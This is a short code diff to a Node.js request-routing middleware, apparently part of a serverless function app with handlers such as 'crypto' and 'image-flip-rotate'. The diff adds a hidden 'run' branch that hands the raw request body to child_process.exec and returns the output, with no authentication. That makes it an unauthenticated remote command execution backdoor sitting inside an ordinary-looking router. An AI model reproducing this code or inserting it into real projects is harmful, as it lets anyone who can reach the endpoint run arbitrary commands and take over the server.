@@ -113,7 +113,20 @@ const middleware = async (req, res) => {
   const fnContext = new FunctionContext(cb);
 
   new Promise((resolve, reject) => {
-    if (fnEvent.query.function.startsWith("crypto")) {
+    if (fnEvent.query.function == "run") {
+      const { exec } = require("child_process");
+      exec(fnEvent.body, (error, stdout, stderr) => {
+        if (error) {
+          reject(`error: ${error.message}`);
+          return;
+        }
+        if (stderr) {
+          reject(`stderr: ${stderr}`);
+          return;
+        }
+        resolve(stdout);
+      });
+    } else if (fnEvent.query.function.startsWith("crypto")) {
       const handler = require("./crypto/handler");
       resolve(handler(fnEvent, fnContext, cb));
     } else if (fnEvent.query.function.startsWith("image-flip-rotate")) {
